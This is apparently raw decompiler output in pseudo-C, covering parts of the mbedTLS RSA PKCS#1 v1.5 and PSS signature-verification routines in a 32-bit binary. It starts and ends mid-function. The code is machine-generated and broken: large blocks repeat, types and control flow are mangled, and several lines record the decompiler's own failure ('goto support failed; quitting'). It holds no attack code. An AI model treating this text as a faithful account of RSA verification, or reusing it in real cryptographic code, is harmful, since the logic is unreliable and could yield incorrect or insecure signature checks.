                                        if (v5 == v18 + 6 + v24) {
                                            // 0x804fe70
                                            v12 = &v22;
                                            v15 = mbedtls_asn1_get_tag((int32_t *)g7, g3, (int32_t)&v21, 6);
                                            g6 = v12;
                                            if (v15 == 0) {
                                                // 0x804fea2
                                                v19 += v21;
                                                if (mbedtls_oid_get_md_alg(v12, &v20) == 0) {
                                                    // 0x804fec5
                                                    if (v20 == a5) {
                                                        // 0x804fed1
                                                        if (mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 5) == 0) {
                                                            // 0x804fef4
                                                            result2 = mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 4);
                                                            if (result2 == 0) {
                                                                // 0x804ff19
                                                                n2 = v18;
                                                                if (n2 == g5) {
                                                                    // 0x804ff22
                                                                    str3 = v19;
                                                                    memcmp_rc = memcmp((char *)str3, (char *)str2, n2);
                                                                    g6 = str3;
                                                                    if (memcmp_rc == 0) {
                                                                        // 0x804ff4c
                                                                        v7 = g5 + str3;
                                                                        g6 = v7;
                                                                        if (g3 == v7) {
                                                                            // 0x804fd0f
                                                                            g3 = v3;
                                                                            return result2;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            // 0x804fdcc
                            result = -0x4380;
                            // branch -> 0x804fd0f
                        }
                        // 0x804fd0f
                        g3 = v3;
                        return result;
                    }
                }
                // 0x804fcf7
                result = -0x4100;
                // branch -> 0x804fd0f
            }
        }
        // 0x804fd0f
        g3 = v3;
        return result;
    }
    // 0x804fd00
    if (*(int32_t *)(v4 + 164) != 0) {
        // 0x804fd0a
        // branch -> 0x804fd0f
        // 0x804fd0f
        g3 = v3;
        return -0x4080;
    }
    // 0x804fcc0
    v26 = *(int32_t *)(v4 + 4);
    g3 = v26;
    v25 = v26 - 16;
    g7 = v25;
    if (v25 > 1008) {
        // 0x804fd0a
        result = -0x4080;
        // branch -> 0x804fd0f
    } else {
        // 0x804fcce
        v8 = &v17;
        g5 = v8;
        if (a4 == 0) {
            // 0x804fcd2
            v23 = mbedtls_rsa_public(v4, a8, v8);
            // branch -> 0x804fcea
        } else {
            // 0x804fd20
            v23 = mbedtls_rsa_private(v4, (int32_t)a2, a3, a8, v8);
            // branch -> 0x804fcea
        }
        // 0x804fcea
        result = v23;
        if (v23 == 0) {
            // 0x804fcee
            if (v17 % 256 == 0) {
                // 0x804fd48
                if (v2 == 1) {
                    // 0x804fd51
                    v9 = &v16;
                    g6 = v9;
                    if (v16 % 256 != 0) {
                        // 0x804fd62
                        v27 = g5 - 1 + g3;
                        g4 = v27;
                        if (v27 > v9) {
                            // 0x804fd6a
                            // branch -> 0x804fcf7
                        }
                        // 0x804fcf7
                        // branch -> 0x804fd0f
                        // 0x804fd0f
                        g3 = v3;
                        return -0x4100;
                    }
                    // 0x804fd97
                    v10 = &str;
                    g6 = n;
                    v5 = g3 + g5 - v10;
                    v19 = v10;
                    if (v5 == n) {
                        // 0x804fdab
                        if (a5 == 0) {
                            // 0x804fdb1
                            g4 = str2;
                            if (memcmp((char *)&str, (char *)str2, n) != 0) {
                                // 0x804fdcc
                                result = -0x4380;
                                // branch -> 0x804fd0f
                            }
                            // 0x804fd0f
                            g3 = v3;
                            return result;
                        }
                    }
                    // 0x804fdde
                    v13 = mbedtls_md_info_from_type(a5);
                    if (v13 == 0) {
                        // 0x804fd0a
                        result = -0x4080;
                        // branch -> 0x804fd0f
                    } else {
                        // 0x804fdf1
                        g7 = &v19;
                        v14 = mbedtls_md_get_size(v13);
                        v11 = &v18;
                        v6 = v19 + v5;
                        g3 = v6;
                        g5 = v14;
                        if (mbedtls_asn1_get_tag((int32_t *)g7, v6, v11, 48) == 0) {
                            // 0x804fe26
                            if (v18 + 2 == v5) {
                                // 0x804fe34
                                if (mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 48) == 0) {
                                    // 0x804fe57
                                    v24 = g5 % 256;
                                    g5 = v24;
                                    if (v5 == v18 + 6 + v24) {
                                        // 0x804fe70
                                        v12 = &v22;
                                        v15 = mbedtls_asn1_get_tag((int32_t *)g7, g3, (int32_t)&v21, 6);
                                        g6 = v12;
                                        if (v15 == 0) {
                                            // 0x804fea2
                                            v19 += v21;
                                            if (mbedtls_oid_get_md_alg(v12, &v20) == 0) {
                                                // 0x804fec5
                                                if (v20 == a5) {
                                                    // 0x804fed1
                                                    if (mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 5) == 0) {
                                                        // 0x804fef4
                                                        result2 = mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 4);
                                                        if (result2 == 0) {
                                                            // 0x804ff19
                                                            n2 = v18;
                                                            if (n2 == g5) {
                                                                // 0x804ff22
                                                                str3 = v19;
                                                                memcmp_rc = memcmp((char *)str3, (char *)str2, n2);
                                                                g6 = str3;
                                                                if (memcmp_rc == 0) {
                                                                    // 0x804ff4c
                                                                    v7 = g5 + str3;
                                                                    g6 = v7;
                                                                    if (g3 == v7) {
                                                                        // 0x804fd0f
                                                                        g3 = v3;
                                                                        return result2;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        // 0x804fdcc
                        result = -0x4380;
                        // branch -> 0x804fd0f
                    }
                    // 0x804fd0f
                    g3 = v3;
                    return result;
                }
            }
            // 0x804fcf7
            result = -0x4100;
            // branch -> 0x804fd0f
        }
    }
    // 0x804fd0f
    g3 = v3;
    return result;
}

// Address range: 0x804ff60 - 0x805027f
int32_t mbedtls_rsa_rsassa_pss_verify_ext(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = g7; // 0x804ff6c
    int32_t v2 = g5; // 0x804ff72
    int32_t v3 = (int32_t)a1;
    g7 = v3;
    g5 = a5;
    int32_t v4; // 0x805018d
    int32_t v5; // 0x8050164
    int32_t v6; // 0x80501ae
    int32_t v7; // 0x804ff9b_0
    int32_t v8; // 0x805006c_0
    int32_t n; // bp+047
    int32_t v9; // 0x8050025
    int32_t v10; // 0x8050035
    int32_t v11; // 0x8050052
    uint32_t v12; // 0x8050067
    int32_t v13; // 0x805008d
    int32_t memcmp_rc; // 0x805023e
    uint32_t v14; // 0x80500da
    uint32_t v15; // 0x8050156
    int32_t str;
    int32_t v16;
    int32_t v17;
    int32_t v18;
    int32_t v19;
    int32_t v20; // 0x8050150
    int32_t v21; // 0x80501a8
    int32_t v22;
    int32_t v23; // 0x805002e
    int32_t v24; // 0x80500dc
    int32_t v25; // 0x805016a
    int32_t v26; // 0x8050135
    int32_t v27; // 0x8050170
    int32_t v28; // 0x805018d
    int32_t v29; // 0x80500d5
    int32_t v30; // 0x804ff83
    uint32_t v31; // 0x80500ce
    int32_t v32; // 0x80501d845
    int32_t v33; // 0x805022d44
    int32_t v34; // 0x8050158
    int32_t v35; // 0x804ff8c
    int32_t v36; // 0x804ffc3
    int32_t v37; // 0x805009e
    int32_t v38; // 0x8050132
    if (a4 == 1) {
        // 0x804ffe0
        if (*(int32_t *)(v3 + 164) != 1) {
            // 0x804ffe9
            g3 = -0x4080;
            // branch -> 0x804ffee
            // 0x804ffee
            g7 = v1;
            g5 = v2;
            return g3;
        }
        // 0x804ff83
        v30 = *(int32_t *)(v3 + 4);
        v35 = v30 - 16;
        g4 = v35;
        if (v35 > 1008) {
            // 0x804ffe9
            g3 = -0x4080;
            // branch -> 0x804ffee
            // 0x804ffee
            g7 = v1;
            g5 = v2;
            return g3;
        }
        // 0x804ff97
        v7 = &v17;
        if (a4 == 0) {
            // 0x804ffb9
            mbedtls_rsa_public(v3, a10, v7);
            g3 = v7;
            // branch -> 0x804ffee
        } else {
            // 0x804ffb9
            g4 = v7;
            v22 = (int32_t)a2;
            v9 = mbedtls_rsa_private(v3, v22, a3, a10, v7);
            g3 = v9;
            if (v9 == 0) {
                // 0x804ffbd
                v36 = v30 - 1;
                if (*(char *)(v30 - 1133 + g2) == -68) {
                    // 0x805002e
                    v23 = g5;
                    if (v23 == 0) {
                        v32 = a6;
                        // 0x805004c
                        v11 = mbedtls_md_info_from_type(a8);
                        if (v11 != 0) {
                            // 0x805005b
                            v12 = mbedtls_md_get_size(v11);
                            v8 = &v18;
                            n = v12 % 256;
                            memset((char *)&v18, 0, 2);
                            v13 = mbedtls_mpi_bitlen(g7 + 8, v22);
                            g5 = v7;
                            v37 = v13 - 1;
                            v33 = v30;
                            if (v37 == 7) {
                                // 0x80500ab
                                g5 = &v16;
                                v33 = v36;
                                // branch -> 0x80500bd
                            }
                            // 0x80500bd
                            v31 = v17 % 256;
                            v29 = 8 * (1 - v33) + v37;
                            g4 = v29;
                            v14 = v29 % 32;
                            v24 = v31;
                            if (v14 != 0) {
                                // if_80500da_0_true
                                v24 = v31 >> v14;
                                // branch -> after_if_80500da_0
                            }
                            // after_if_80500da_0
                            if (v24 == 0) {
                                // 0x80500e4
                                g7 = &v19;
                                g1 = mbedtls_md_init(&v19);
                                g6 = v11;
                                mbedtls_md_setup((int32_t *)g7, v11, 0);
                                v38 = v33 - n - 1;
                                g6 = v38;
                                v26 = g5;
                                g4 = v26 + v38;
                                g1 = v26;
                                mgf_mask(n, (int32_t *)g7, 0, a10, v7);
                                v20 = 8 * v33 - v37;
                                g4 = v20;
                                v15 = v20 % 32;
                                v34 = 255;
                                if (v15 != 0) {
                                    // if_8050156_0_true
                                    v34 = 255 >> v15;
                                    // branch -> after_if_8050156_0
                                }
                                // after_if_8050156_0
                                v17 = 0x1000000 * (v17 & v34) / 0x1000000;
                                v5 = v33 + v7;
                                g1 = v5;
                                v25 = g5;
                                v28 = v25;
                                if (v25 >= v5) {
                                    // 0x805017c
                                    if (v28 != v5) {
                                        // 0x8050184
                                        if (*(char *)v28 == 1) {
                                            // 0x805018d
                                            v4 = v28 + 1;
                                            v21 = v7 - v4;
                                            g1 = v21;
                                            v6 = v21 + v36 - n;
                                            g5 = v6;
                                            if (v6 != a9) {
                                                // 0x8050264
                                                if (a9 != -1) {
                                                    // 0x805026e
                                                    mbedtls_md_free((char *)g7);
                                                    // branch -> 0x804ffd6
                                                    // 0x804ffd6
                                                    g3 = -0x4100;
                                                    // branch -> 0x804ffee
                                                    // 0x804ffee
                                                    g7 = v1;
                                                    g5 = v2;
                                                    return g3;
                                                }
                                            }
                                            // 0x80501b9
                                            mbedtls_md_starts((int32_t *)g7);
                                            mbedtls_md_update((int32_t *)g7, v8, 8);
                                            mbedtls_md_update((int32_t *)g7, a7, v32);
                                            mbedtls_md_update((int32_t *)g7, v4, g5);
                                            g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                            mbedtls_md_free((char *)g7);
                                            g4 = n;
                                            memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                            if (memcmp_rc != 0) {
                                                // if_805024a_0_true
                                                g3 = -0x4380;
                                                // branch -> 0x804ffee
                                            }
                                            // 0x804ffee
                                            g7 = v1;
                                            g5 = v2;
                                            return g3;
                                        }
                                    }
                                    // 0x8050252
                                    g3 = -0x4100;
                                    mbedtls_md_free((char *)g7);
                                    // branch -> 0x804ffee
                                    // 0x804ffee
                                    g7 = v1;
                                    g5 = v2;
                                    return g3;
                                }
                                v27 = v25;
                                while (true) {
                                    // 0x8050177
                                    if (*(char *)v27 == 0) {
                                      lab_0x8050170_3:;
                                        int32_t v39 = v27 + 1; // 0x8050170
                                        g5 = v39;
                                        if (v39 >= v5) {
                                            v28 = v39;
                                            // break -> 0x805017c
                                            break;
                                        }
                                        v27 = v39;
                                        // continue -> 0x8050177
                                        continue;
                                    } else {
                                        v28 = v27;
                                    }
                                }
                                // 0x805017c
                                if (v28 != v5) {
                                    // 0x8050184
                                    if (*(char *)v28 == 1) {
                                        // 0x805018d
                                        v4 = v28 + 1;
                                        v21 = v7 - v4;
                                        g1 = v21;
                                        v6 = v21 + v36 - n;
                                        g5 = v6;
                                        if (v6 != a9) {
                                            // 0x8050264
                                            if (a9 != -1) {
                                                // 0x805026e
                                                mbedtls_md_free((char *)g7);
                                                // branch -> 0x804ffd6
                                                // 0x804ffd6
                                                g3 = -0x4100;
                                                // branch -> 0x804ffee
                                                // 0x804ffee
                                                g7 = v1;
                                                g5 = v2;
                                                return g3;
                                            }
                                        }
                                        // 0x80501b9
                                        mbedtls_md_starts((int32_t *)g7);
                                        mbedtls_md_update((int32_t *)g7, v8, 8);
                                        mbedtls_md_update((int32_t *)g7, a7, v32);
                                        mbedtls_md_update((int32_t *)g7, v4, g5);
                                        g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                        mbedtls_md_free((char *)g7);
                                        g4 = n;
                                        memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                        if (memcmp_rc != 0) {
                                            // if_805024a_0_true
                                            g3 = -0x4380;
                                            // branch -> 0x804ffee
                                        }
                                        // 0x804ffee
                                        g7 = v1;
                                        g5 = v2;
                                        return g3;
                                    }
                                }
                                // 0x8050252
                                g3 = -0x4100;
                                mbedtls_md_free((char *)g7);
                                // branch -> 0x804ffee
                                // 0x804ffee
                                g7 = v1;
                                g5 = v2;
                                return g3;
                            }
                        }
                    } else {
                        // 0x8050032
                        v10 = mbedtls_md_info_from_type(v23);
                        if (v10 != 0) {
                            // 0x805003e
                            v32 = mbedtls_md_get_size(v10) % 256;
                            // branch -> 0x805004c
                            // 0x805004c
                            v11 = mbedtls_md_info_from_type(a8);
                            if (v11 != 0) {
                                // 0x805005b
                                v12 = mbedtls_md_get_size(v11);
                                v8 = &v18;
                                n = v12 % 256;
                                memset((char *)&v18, 0, 2);
                                v13 = mbedtls_mpi_bitlen(g7 + 8, v22);
                                g5 = v7;
                                v37 = v13 - 1;
                                v33 = v30;
                                if (v37 == 7) {
                                    // 0x80500ab
                                    g5 = &v16;
                                    v33 = v36;
                                    // branch -> 0x80500bd
                                }
                                // 0x80500bd
                                v31 = v17 % 256;
                                v29 = 8 * (1 - v33) + v37;
                                g4 = v29;
                                v14 = v29 % 32;
                                v24 = v31;
                                if (v14 != 0) {
                                    // if_80500da_0_true
                                    v24 = v31 >> v14;
                                    // branch -> after_if_80500da_0
                                }
                                // after_if_80500da_0
                                if (v24 == 0) {
                                    // 0x80500e4
                                    g7 = &v19;
                                    g1 = mbedtls_md_init(&v19);
                                    g6 = v11;
                                    mbedtls_md_setup((int32_t *)g7, v11, 0);
                                    v38 = v33 - n - 1;
                                    g6 = v38;
                                    v26 = g5;
                                    g4 = v26 + v38;
                                    g1 = v26;
                                    mgf_mask(n, (int32_t *)g7, 0, a10, v7);
                                    v20 = 8 * v33 - v37;
                                    g4 = v20;
                                    v15 = v20 % 32;
                                    v34 = 255;
                                    if (v15 != 0) {
                                        // if_8050156_0_true
                                        v34 = 255 >> v15;
                                        // branch -> after_if_8050156_0
                                    }
                                    // after_if_8050156_0
                                    v17 = 0x1000000 * (v17 & v34) / 0x1000000;
                                    v5 = v33 + v7;
                                    g1 = v5;
                                    v25 = g5;
                                    v28 = v25;
                                    if (v25 < v5) {
                                        v27 = v25;
                                        while (true) {
                                            // 0x8050177
                                            if (*(char *)v27 == 0) {
                                                goto lab_0x8050170_3;
                                            }
                                            v28 = v27;
                                            // 0x805017c
                                            if (v28 != v5) {
                                                // 0x8050184
                                                if (*(char *)v28 == 1) {
                                                    // 0x805018d
                                                    v4 = v28 + 1;
                                                    v21 = v7 - v4;
                                                    g1 = v21;
                                                    v6 = v21 + v36 - n;
                                                    g5 = v6;
                                                    if (v6 != a9) {
                                                        // 0x8050264
                                                        if (a9 != -1) {
                                                            // 0x805026e
                                                            mbedtls_md_free((char *)g7);
                                                            // branch -> 0x804ffd6
                                                            // 0x804ffd6
                                                            g3 = -0x4100;
                                                            // branch -> 0x804ffee
                                                            // 0x804ffee
                                                            g7 = v1;
                                                            g5 = v2;
                                                            return g3;
                                                        }
                                                    }
                                                    // 0x80501b9
                                                    mbedtls_md_starts((int32_t *)g7);
                                                    mbedtls_md_update((int32_t *)g7, v8, 8);
                                                    mbedtls_md_update((int32_t *)g7, a7, v32);
                                                    mbedtls_md_update((int32_t *)g7, v4, g5);
                                                    g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                                    mbedtls_md_free((char *)g7);
                                                    g4 = n;
                                                    memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                                    if (memcmp_rc != 0) {
                                                        // if_805024a_0_true
                                                        g3 = -0x4380;
                                                        // branch -> 0x804ffee
                                                    }
                                                    // 0x804ffee
                                                    g7 = v1;
                                                    g5 = v2;
                                                    return g3;
                                                }
                                            }
                                            // 0x8050252
                                            g3 = -0x4100;
                                            mbedtls_md_free((char *)g7);
                                            // branch -> 0x804ffee
                                            // 0x804ffee
                                            g7 = v1;
                                            g5 = v2;
                                            return g3;
                                        }
                                    }
                                    // 0x805017c
                                    if (v28 != v5) {
                                        // 0x8050184
                                        if (*(char *)v28 == 1) {
                                            // 0x805018d
                                            v4 = v28 + 1;
                                            v21 = v7 - v4;
                                            g1 = v21;
                                            v6 = v21 + v36 - n;
                                            g5 = v6;
                                            if (v6 != a9) {
                                                // 0x8050264
                                                if (a9 != -1) {
                                                    // 0x805026e
                                                    mbedtls_md_free((char *)g7);
                                                    // branch -> 0x804ffd6
                                                    // 0x804ffd6
                                                    g3 = -0x4100;
                                                    // branch -> 0x804ffee
                                                    // 0x804ffee
                                                    g7 = v1;
                                                    g5 = v2;
                                                    return g3;
                                                }
                                            }
                                            // 0x80501b9
                                            mbedtls_md_starts((int32_t *)g7);
                                            mbedtls_md_update((int32_t *)g7, v8, 8);
                                            mbedtls_md_update((int32_t *)g7, a7, v32);
                                            mbedtls_md_update((int32_t *)g7, v4, g5);
                                            g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                            mbedtls_md_free((char *)g7);
                                            g4 = n;
                                            memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                            if (memcmp_rc != 0) {
                                                // if_805024a_0_true
                                                g3 = -0x4380;
                                                // branch -> 0x804ffee
                                            }
                                            // 0x804ffee
                                            g7 = v1;
                                            g5 = v2;
                                            return g3;
                                        }
                                    }
                                    // 0x8050252
                                    g3 = -0x4100;
                                    mbedtls_md_free((char *)g7);
                                    // branch -> 0x804ffee
                                    // 0x804ffee
                                    g7 = v1;
                                    g5 = v2;
                                    return g3;
                                }
                            }
                        }
                    }
                    // 0x804ffe9
                    g3 = -0x4080;
                    // branch -> 0x804ffee
                } else {
                    // 0x804ffd6
                    g3 = -0x4100;
                    // branch -> 0x804ffee
                }
                // 0x804ffee
                g7 = v1;
                g5 = v2;
                return g3;
            }
        }
        // 0x804ffee
        g7 = v1;
        g5 = v2;
        return g3;
    }
    // 0x804ff83
    v30 = *(int32_t *)(v3 + 4);
    v35 = v30 - 16;
    g4 = v35;
    if (v35 > 1008) {
        // 0x804ffe9
        g3 = -0x4080;
        // branch -> 0x804ffee
    } else {
        // 0x804ff97
        v7 = &v17;
        if (a4 == 0) {
            // 0x804ffb9
            mbedtls_rsa_public(v3, a10, v7);
            g3 = v7;
            // branch -> 0x804ffee
        } else {
            // 0x804ffb9
            g4 = v7;
            v22 = (int32_t)a2;
            v9 = mbedtls_rsa_private(v3, v22, a3, a10, v7);
            g3 = v9;
            if (v9 == 0) {
                // 0x804ffbd
                v36 = v30 - 1;
                if (*(char *)(v30 - 1133 + g2) == -68) {
                    // 0x805002e
                    v23 = g5;
                    if (v23 == 0) {
                        v32 = a6;
                        // 0x805004c
                        v11 = mbedtls_md_info_from_type(a8);
                        if (v11 != 0) {
                            // 0x805005b
                            v12 = mbedtls_md_get_size(v11);
                            v8 = &v18;
                            n = v12 % 256;
                            memset((char *)&v18, 0, 2);
                            v13 = mbedtls_mpi_bitlen(g7 + 8, v22);
                            g5 = v7;
                            v37 = v13 - 1;
                            v33 = v30;
                            if (v37 == 7) {
                                // 0x80500ab
                                g5 = &v16;
                                v33 = v36;
                                // branch -> 0x80500bd
                            }
                            // 0x80500bd
                            v31 = v17 % 256;
                            v29 = 8 * (1 - v33) + v37;
                            g4 = v29;
                            v14 = v29 % 32;
                            v24 = v31;
                            if (v14 != 0) {
                                // if_80500da_0_true
                                v24 = v31 >> v14;
                                // branch -> after_if_80500da_0
                            }
                            // after_if_80500da_0
                            if (v24 == 0) {
                                // 0x80500e4
                                g7 = &v19;
                                g1 = mbedtls_md_init(&v19);
                                g6 = v11;
                                mbedtls_md_setup((int32_t *)g7, v11, 0);
                                v38 = v33 - n - 1;
                                g6 = v38;
                                v26 = g5;
                                g4 = v26 + v38;
                                g1 = v26;
                                mgf_mask(n, (int32_t *)g7, 0, a10, v7);
                                v20 = 8 * v33 - v37;
                                g4 = v20;
                                v15 = v20 % 32;
                                v34 = 255;
                                if (v15 != 0) {
                                    // if_8050156_0_true
                                    v34 = 255 >> v15;
                                    // branch -> after_if_8050156_0
                                }
                                // after_if_8050156_0
                                v17 = 0x1000000 * (v17 & v34) / 0x1000000;
                                v5 = v33 + v7;
                                g1 = v5;
                                v25 = g5;
                                v28 = v25;
                                if (v25 < v5) {
                                    v27 = v25;
                                    while (true) {
                                        // 0x8050177
                                        if (*(char *)v27 == 0) {
                                            goto lab_0x8050170_3;
                                        }
                                        v28 = v27;
                                        // 0x805017c
                                        if (v28 != v5) {
                                            // 0x8050184
                                            if (*(char *)v28 == 1) {
                                                // 0x805018d
                                                v4 = v28 + 1;
                                                v21 = v7 - v4;
                                                g1 = v21;
                                                v6 = v21 + v36 - n;
                                                g5 = v6;
                                                if (v6 != a9) {
                                                    // 0x8050264
                                                    if (a9 != -1) {
                                                        // 0x805026e
                                                        mbedtls_md_free((char *)g7);
                                                        // branch -> 0x804ffd6
                                                        // 0x804ffd6
                                                        g3 = -0x4100;
                                                        // branch -> 0x804ffee
                                                        // 0x804ffee
                                                        g7 = v1;
                                                        g5 = v2;
                                                        return g3;
                                                    }
                                                }
                                                // 0x80501b9
                                                mbedtls_md_starts((int32_t *)g7);
                                                mbedtls_md_update((int32_t *)g7, v8, 8);
                                                mbedtls_md_update((int32_t *)g7, a7, v32);
                                                mbedtls_md_update((int32_t *)g7, v4, g5);
                                                g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                                mbedtls_md_free((char *)g7);
                                                g4 = n;
                                                memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                                if (memcmp_rc != 0) {
                                                    // if_805024a_0_true
                                                    g3 = -0x4380;
                                                    // branch -> 0x804ffee
                                                }
                                                // 0x804ffee
                                                g7 = v1;
                                                g5 = v2;
                                                return g3;
                                            }
                                        }
                                        // 0x8050252
                                        g3 = -0x4100;
                                        mbedtls_md_free((char *)g7);
                                        // branch -> 0x804ffee
                                        // 0x804ffee
                                        g7 = v1;
                                        g5 = v2;
                                        return g3;
                                    }
                                }
                                // 0x805017c
                                if (v28 != v5) {
                                    // 0x8050184
                                    if (*(char *)v28 == 1) {
                                        // 0x805018d
                                        v4 = v28 + 1;
                                        v21 = v7 - v4;
                                        g1 = v21;
                                        v6 = v21 + v36 - n;
                                        g5 = v6;
                                        if (v6 != a9) {
                                            // 0x8050264
                                            if (a9 != -1) {
                                                // 0x805026e
                                                mbedtls_md_free((char *)g7);
                                                // branch -> 0x804ffd6
                                                // 0x804ffd6
                                                g3 = -0x4100;
                                                // branch -> 0x804ffee
                                                // 0x804ffee
                                                g7 = v1;
                                                g5 = v2;
                                                return g3;
                                            }
                                        }
                                        // 0x80501b9
                                        mbedtls_md_starts((int32_t *)g7);
                                        mbedtls_md_update((int32_t *)g7, v8, 8);
                                        mbedtls_md_update((int32_t *)g7, a7, v32);
                                        mbedtls_md_update((int32_t *)g7, v4, g5);
                                        g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                        mbedtls_md_free((char *)g7);
                                        g4 = n;
                                        memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                        if (memcmp_rc != 0) {
                                            // if_805024a_0_true
                                            g3 = -0x4380;
                                            // branch -> 0x804ffee
                                        }
                                        // 0x804ffee
                                        g7 = v1;
                                        g5 = v2;
                                        return g3;
                                    }
                                }
                                // 0x8050252
                                g3 = -0x4100;
                                mbedtls_md_free((char *)g7);
                                // branch -> 0x804ffee
                                // 0x804ffee
                                g7 = v1;
                                g5 = v2;
                                return g3;
                            }
                        }
                    } else {
                        // 0x8050032
                        v10 = mbedtls_md_info_from_type(v23);
                        if (v10 != 0) {
                            // 0x805003e
                            v32 = mbedtls_md_get_size(v10) % 256;
                            // branch -> 0x805004c
                            // 0x805004c
                            v11 = mbedtls_md_info_from_type(a8);
                            if (v11 != 0) {
                                // 0x805005b
                                v12 = mbedtls_md_get_size(v11);
                                v8 = &v18;
                                n = v12 % 256;
                                memset((char *)&v18, 0, 2);
                                v13 = mbedtls_mpi_bitlen(g7 + 8, v22);
                                g5 = v7;
                                v37 = v13 - 1;
                                v33 = v30;
                                if (v37 == 7) {
                                    // 0x80500ab
                                    g5 = &v16;
                                    v33 = v36;
                                    // branch -> 0x80500bd
                                }
                                // 0x80500bd
                                v31 = v17 % 256;
                                v29 = 8 * (1 - v33) + v37;
                                g4 = v29;
                                v14 = v29 % 32;
                                v24 = v31;
                                if (v14 != 0) {
                                    // if_80500da_0_true
                                    v24 = v31 >> v14;
                                    // branch -> after_if_80500da_0
                                }
                                // after_if_80500da_0
                                if (v24 == 0) {
                                    // 0x80500e4
                                    g7 = &v19;
                                    g1 = mbedtls_md_init(&v19);
                                    g6 = v11;
                                    mbedtls_md_setup((int32_t *)g7, v11, 0);
                                    v38 = v33 - n - 1;
                                    g6 = v38;
                                    v26 = g5;
                                    g4 = v26 + v38;
                                    g1 = v26;
                                    mgf_mask(n, (int32_t *)g7, 0, a10, v7);
                                    v20 = 8 * v33 - v37;
                                    g4 = v20;
                                    v15 = v20 % 32;
                                    v34 = 255;
                                    if (v15 != 0) {
                                        // if_8050156_0_true
                                        v34 = 255 >> v15;
                                        // branch -> after_if_8050156_0
                                    }
                                    // after_if_8050156_0
                                    v17 = 0x1000000 * (v17 & v34) / 0x1000000;
                                    v5 = v33 + v7;
                                    g1 = v5;
                                    v25 = g5;
                                    v28 = v25;
                                    if (v25 < v5) {
                                        v27 = v25;
                                        while (true) {
                                            // 0x8050177
                                            if (*(char *)v27 == 0) {
                                                goto lab_0x8050170_3;
                                            }
                                            v28 = v27;
                                            // 0x805017c
                                            if (v28 != v5) {
                                                // 0x8050184
                                                if (*(char *)v28 == 1) {
                                                    // 0x805018d
                                                    v4 = v28 + 1;
                                                    v21 = v7 - v4;
                                                    g1 = v21;
                                                    v6 = v21 + v36 - n;
                                                    g5 = v6;
                                                    if (v6 != a9) {
                                                        // 0x8050264
                                                        if (a9 != -1) {
                                                            // 0x805026e
                                                            mbedtls_md_free((char *)g7);
                                                            // branch -> 0x804ffd6
                                                            // 0x804ffd6
                                                            g3 = -0x4100;
                                                            // branch -> 0x804ffee
                                                            // 0x804ffee
                                                            g7 = v1;
                                                            g5 = v2;
                                                            return g3;
                                                        }
                                                    }
                                                    // 0x80501b9
                                                    mbedtls_md_starts((int32_t *)g7);
                                                    mbedtls_md_update((int32_t *)g7, v8, 8);
                                                    mbedtls_md_update((int32_t *)g7, a7, v32);
                                                    mbedtls_md_update((int32_t *)g7, v4, g5);
                                                    g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                                    mbedtls_md_free((char *)g7);
                                                    g4 = n;
                                                    memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                                    if (memcmp_rc != 0) {
                                                        // if_805024a_0_true
                                                        g3 = -0x4380;
                                                        // branch -> 0x804ffee
                                                    }
                                                    // 0x804ffee
                                                    g7 = v1;
                                                    g5 = v2;
                                                    return g3;
                                                }
                                            }
                                            // 0x8050252
                                            g3 = -0x4100;
                                            mbedtls_md_free((char *)g7);
                                            // branch -> 0x804ffee
                                            // 0x804ffee
                                            g7 = v1;
                                            g5 = v2;
                                            return g3;
                                        }
                                    }
                                    // 0x805017c
                                    if (v28 != v5) {
                                        // 0x8050184
                                        if (*(char *)v28 == 1) {
                                            // 0x805018d
                                            v4 = v28 + 1;
                                            v21 = v7 - v4;
                                            g1 = v21;
                                            v6 = v21 + v36 - n;
                                            g5 = v6;
                                            if (v6 != a9) {
                                                // 0x8050264
                                                if (a9 != -1) {
                                                    // 0x805026e
                                                    mbedtls_md_free((char *)g7);
                                                    // branch -> 0x804ffd6
                                                    // 0x804ffd6
                                                    g3 = -0x4100;
                                                    // branch -> 0x804ffee
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                            }
                                            // 0x80501b9
                                            mbedtls_md_starts((int32_t *)g7);
                                            mbedtls_md_update((int32_t *)g7, v8, 8);
                                            mbedtls_md_update((int32_t *)g7, a7, v32);
                                            mbedtls_md_update((int32_t *)g7, v4, g5);
                                            g1 = mbedtls_md_finish((int32_t *)g7, (int32_t)&str);
                                            mbedtls_md_free((char *)g7);
                                            g4 = n;
                                            memcmp_rc = memcmp((char *)(g5 + v4), (char *)&str, n);
                                            if (memcmp_rc != 0) {
                                                // if_805024a_0_true
                                                g3 = -0x4380;
                                                // branch -> 0x804ffee
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                    }
                                    // 0x8050252
                                    g3 = -0x4100;
                                    mbedtls_md_free((char *)g7);
                                    // branch -> 0x804ffee
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                        }
                    }
                    // 0x804ffe9
                    g3 = -0x4080;
                    // branch -> 0x804ffee
                } else {
                    // 0x804ffd6
                    g3 = -0x4100;
                    // branch -> 0x804ffee
                }
